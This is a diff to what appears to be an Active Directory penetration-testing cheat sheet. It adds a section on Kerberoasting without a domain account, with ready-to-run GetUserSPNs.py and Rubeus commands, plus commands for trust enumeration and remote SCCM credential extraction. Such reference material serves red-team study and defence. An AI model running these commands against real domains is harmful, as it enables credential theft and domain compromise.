@@ -60,6 +60,7 @@
     - [Pass-the-Ticket Sapphire Tickets](#pass-the-ticket-sapphire-tickets)
   - [Kerberoasting](#kerberoasting)
   - [KRB_AS_REP Roasting](#krb_as_rep-roasting)
+  - [Kerberoasting w/o domain account](#kerberoasting-wo-domain-account)
   - [CVE-2022-33679](#cve-2022-33679)
   - [Timeroasting](#timeroasting)
   - [Pass-the-Hash](#pass-the-hash)
@@ -322,7 +323,7 @@ root@payload$ apt install bloodhound
 # start BloodHound and the database
 root@payload$ neo4j console
 # or use docker
-root@payload$ docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j
+root@payload$ docker run -itd -p 7687:7687 -p 7474:7474 --env NEO4J_AUTH=neo4j/bloodhound -v $(pwd)/neo4j:/data neo4j:4.4-community
 
 root@payload$ ./bloodhound --no-sandbox
 Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j
@@ -1987,6 +1988,23 @@ C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproa
 * All accounts must have "Kerberos Pre-Authentication" enabled (Enabled by Default).
 
 
+## Kerberoasting w/o domain account
+
+> In September 2022 a vulnerability was discovered by [Charlie Clark](https://exploit.ph/), ST (Service Tickets) can be obtained through KRB_AS_REQ request without having to control any Active Directory account. If a principal can authenticate without pre-authentication (like AS-REP Roasting attack), it is possible to use it to launch an **KRB_AS_REQ** request and trick the request to ask for a **ST** instead of a **encrypted TGT**, by modifying the **sname** attribute in the req-body part of the request.
+
+The technique is fully explained in this article: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
+
+:warning: You must provide a list of users because we don't have a valid account to query the LDAP using this technique.
+
+* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413)
+  ```powershell
+  GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
+  ```
+* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139)
+  ```powershell
+  Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
+  ```
+
 
 ## CVE-2022-33679
 
@@ -3422,19 +3440,22 @@ $obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$nul
 
 ### Enumerate trusts between domains
 
-```powershell
-nltest /trusted_domains
-```
+* Native `nltest`
+  ```powershell
+  nltest /trusted_domains
+  ```
+* PowerShell `GetAllTrustRelationships`
+  ```powershell
+  ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
 
-or
-
-```powershell
-([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
-
-SourceName          TargetName                    TrustType      TrustDirection
-----------          ----------                    ---------      --------------
-domainA.local      domainB.local                  TreeRoot       Bidirectional
-```
+  SourceName          TargetName                    TrustType      TrustDirection
+  ----------          ----------                    ---------      --------------
+  domainA.local      domainB.local                  TreeRoot       Bidirectional
+  ```
+* Crackmapexec module `enum_trusts`
+  ```powershell
+  cme ldap <ip> -u <user> -p <pass> -M enum_trusts 
+  ```
 
 ### Exploit trusts between domains
 
@@ -4027,6 +4048,7 @@ python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th 
 
 > If you can escalate on a host that is an SCCM client, you can retrieve plaintext domain credentials.
 
+On the machine.
 * Find SCCM blob
     ```ps1
     Get-Wmiobject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"
@@ -4042,6 +4064,12 @@ python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th 
     ```ps1
     Get-Acl C:\Windows\System32\wbem\Repository\OBJECTS.DATA | Format-List -Property PSPath,sddl
     ConvertFrom-SddlString ""
+    ```
+
+From a remote machine.
+* Using [garrettfoster13/sccmhunter](https://github.com/garrettfoster13/sccmhunter)
+    ```ps1
+    python3 ./sccmhunter.py http -u "administrator" -p "P@ssw0rd" -d internal.lab -dc-ip 10.10.10.10. -auto
     ```
 
 
